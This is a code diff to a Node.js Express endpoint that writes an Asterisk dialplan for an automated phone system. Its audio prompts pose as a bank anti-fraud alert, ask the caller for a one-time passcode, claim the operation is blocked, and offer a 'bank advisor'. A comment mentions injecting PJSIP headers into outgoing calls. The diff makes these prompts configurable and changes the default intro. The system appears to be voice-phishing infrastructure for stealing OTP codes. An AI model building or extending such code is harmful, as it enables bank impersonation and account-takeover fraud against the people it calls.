@@ -430,13 +430,19 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += `; ========================================================\n\n`;
     dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;
 
+    const chosenIntro = req.body.audioIntro || 'custom/banrearreglado';
+    const chosenPrompt = req.body.audioPrompt || 'custom/solicitar_codigo_otp';
+    const chosenWait = req.body.audioWait || 'custom/un_momento_validando_informacion';
+    const chosenSuccess = req.body.audioSuccess || 'custom/operacion_bloqueada_exito';
+    const chosenAgent = req.body.audioAgent || 'custom/conectar_asesor_banco';
+
     dialplanContent += `[globals]\n`;
     dialplanContent += `GLOBAL_CARRIER_HOST=${carrierHost}\n`;
-    dialplanContent += `GLOBAL_DEFAULT_INTRO=custom/alerta_banco_antifraude\n`;
-    dialplanContent += `GLOBAL_DEFAULT_PROMPT=custom/solicitar_codigo_otp\n`;
-    dialplanContent += `GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion\n`;
-    dialplanContent += `GLOBAL_DEFAULT_SUCCESS=custom/operacion_bloqueada_exito\n`;
-    dialplanContent += `GLOBAL_DEFAULT_AGENT=custom/conectar_asesor_banco\n\n`;
+    dialplanContent += `GLOBAL_DEFAULT_INTRO=${chosenIntro}\n`;
+    dialplanContent += `GLOBAL_DEFAULT_PROMPT=${chosenPrompt}\n`;
+    dialplanContent += `GLOBAL_DEFAULT_WAIT=${chosenWait}\n`;
+    dialplanContent += `GLOBAL_DEFAULT_SUCCESS=${chosenSuccess}\n`;
+    dialplanContent += `GLOBAL_DEFAULT_AGENT=${chosenAgent}\n\n`;
 
     dialplanContent += `; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real\n`;
     dialplanContent += `[sub-pjsip-headers]\n`;
@@ -543,7 +549,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/global_intro)}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))\n`;
-    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/alerta_banco_antifraude))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/banrearreglado))\n`;
 
     dialplanContent += ` ; Cascada de resolucion para Audio de Solicitud de Codigo (Prompt OTP)\n`;
     dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
@@ -686,7 +692,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     }
 
     // 4. Save default pre-recorded IVR audios into AstDB for fallback and extension 8888 tests
-    const defaultIntro = req.body.audioIntro || 'custom/alerta_banco_antifraude';
+    const defaultIntro = req.body.audioIntro || 'custom/banrearreglado';
     const defaultPrompt = req.body.audioPrompt || 'custom/solicitar_codigo_otp';
     const defaultWait = req.body.audioWait || 'custom/un_momento_validando_informacion';
     const defaultSuccess = req.body.audioSuccess || 'custom/operacion_bloqueada_exito';
